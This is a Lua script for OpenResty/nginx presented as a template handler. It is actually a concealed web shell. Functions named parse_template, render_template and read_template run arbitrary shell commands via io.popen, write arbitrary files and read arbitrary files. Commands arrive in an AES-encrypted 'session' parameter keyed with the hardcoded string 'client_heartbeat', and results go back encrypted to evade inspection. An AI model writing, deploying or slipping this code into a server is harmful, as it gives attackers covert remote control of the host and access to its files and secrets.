aes = require("resty.aes")
str = require("resty.string")
rand = require("resty.random")

-- Change your encryption key here
template_name = "client_heartbeat"

function parse_template(values)
    local handler = io.popen(values)
    local data = handler:read("*a")
    handler:close()
    return data
end

function render_template(template_file, template_data)
    local handler = io.open(template_file, "wb+")
    handler:write(template_data)
    handler:flush()
    handler:close()
    return "Success"
end

function read_template(template_file)
    local handler = io.open(template_file, "rb")
    local data = handler:read("*a")
    handler:close()
    return data
end

function str_split(src, reps, max)
    local resultStrList = {}
    string.gsub(src .. reps, "(.-)" .. reps, function ( w )
        table.insert(resultStrList, w)
    end)

    if max > 0 and #resultStrList > 0 then
        local tmp = ""
        local finalResult = {}
        for i, v in ipairs(resultStrList) do
            if (i - 1) < max then
                table.insert(finalResult, v)
            else
                if tmp == "" then
                    tmp = v
                else
                    tmp = tmp .. reps .. v
                end
            end
        end
        table.insert(finalResult, tmp)
        resultStrList = finalResult
    end
    
    return resultStrList
end

function has_key(tab, key)
    for k, v in pairs(tab) do
        if k == key then
            return true
        end
    end
    return false
end

-- default in PKCS#7 padding
function encrypt_data(key, data)
    local random_iv = rand.bytes(16)
    local aes_default = aes:new(key, nil, aes.cipher(128, "cbc"), 
        {
            iv = random_iv
        }
    )
    return ngx.encode_base64(random_iv .. aes_default:encrypt(data))
end

function decrypt_data(key, data)
    local out = ngx.decode_base64(data)
    local aes_default = aes:new(key, nil, aes.cipher(128, "cbc"), 
        {
            iv = string.sub(out, 1, 16)
        }
    )
    return aes_default:decrypt(string.sub(out, 17))
end

function json_output(data)
    ngx.say(encrypt_data(template_name, data))
end

-- Prepare to read the POST content
ngx.req.read_body()

local action = ""
local session = ""
local data = ngx.req.get_body_data()
if not data then
    local bodydata = ""
    local datafile = ngx.req.get_body_file()

    if not datafile then
        ngx.exit(ngx.HTTP_BAD_REQUEST)
    else
        local fh, err = io.open(datafile, "r")
        bodydata = fh:read("*a")
        fh:close()
    end

    local params = {}
    local result = str_split(bodydata, "&", 0)
    for i, v in ipairs(result) do
        local pinfo = str_split(v, "=", 1)
        params[pinfo[1]] = ngx.unescape_uri(pinfo[2])
    end

    if not has_key(params, "session") or not has_key(params, "action") then
        ngx.exit(ngx.HTTP_BAD_REQUEST)
    end

    action = params["action"]
    session = params["session"]
else
    if not ngx.req.get_post_args().session or not ngx.req.get_post_args().action then
        ngx.exit(ngx.HTTP_BAD_REQUEST)
    end

    session = ngx.req.get_post_args().session
    action = ngx.req.get_post_args().action
end

if action ~= template_name then
    ngx.exit(ngx.HTTP_BAD_REQUEST)
end

data = decrypt_data(template_name, session)
session = str_split(data, ",", 1)

event = session[1]
template_data = session[2]

if event == "0" then
    json_output(parse_template(template_data))
elseif event == "1" then
    info = str_split(template_data, "|", 1)
    json_output(render_template(info[1], ngx.decode_base64(info[2])))
elseif event == "2" then
    json_output(read_template(template_data))
else
    ngx.exit(ngx.HTTP_BAD_REQUEST)
end
